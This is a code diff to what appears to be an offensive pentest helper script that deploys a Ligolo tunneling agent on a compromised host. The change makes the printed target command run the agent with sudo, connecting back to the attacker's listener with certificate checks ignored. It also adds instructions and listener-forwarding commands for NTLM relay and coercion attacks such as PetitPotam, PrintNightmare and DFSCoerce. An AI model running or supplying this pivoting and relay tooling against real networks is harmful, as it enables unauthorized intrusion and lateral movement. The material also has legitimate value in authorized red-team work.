@@ -103,7 +103,10 @@ def run(data, cred, args):
         if not deliver_linux():
             return data
         
-        payload = f"chmod +x agent && ./agent -connect {lhost}:{port} -ignore-cert"
+        payload = (
+            f"chmod +x agent && "
+            f"sudo ./agent -connect {lhost}:{port} -ignore-cert"
+        )
         print(f"\n{W_BOLD}[*] Run on target:{W}")
         print(f"\n      {Y}{payload}{W}")
         
@@ -115,6 +118,21 @@ def run(data, cred, args):
 
     print(f"{W_BOLD}[*] Post-connection commands:{W}")
     print(f"      {C}session{W}")
-    print(f"      {C}autoroute{W}\n")
+    print(f"      {C}autoroute{W}")
+    print()
+
+    print(f"{W_BOLD}[*] Relay / Coercion attacks:{W}")
+    print(f"      {DIM}# If you want to run ntlmrelayx, PetitPotam, PrintNightmare,{W}")
+    print(f"      {DIM}# ShadowCoerce, PrinterBug, DFSCoerce, etc., expose listeners{W}")
+    print(f"      {DIM}# on the agent so internal hosts can reach your Kali.{W}")
+    print()
+    print(f"      {C}listener_add --addr 0.0.0.0:4444 --to {lhost}:4444 --tcp{W}")
+    print(f"      {C}listener_add --addr 0.0.0.0:8080 --to {lhost}:8080 --tcp{W}")
+    print()
+
+    print(f"      {DIM}# Requires the Ligolo agent to run as root (or have{W}")
+    print(f"      {DIM}# CAP_NET_BIND_SERVICE) to bind ports below 1024.{W}")
+    print()
+
 
     return data
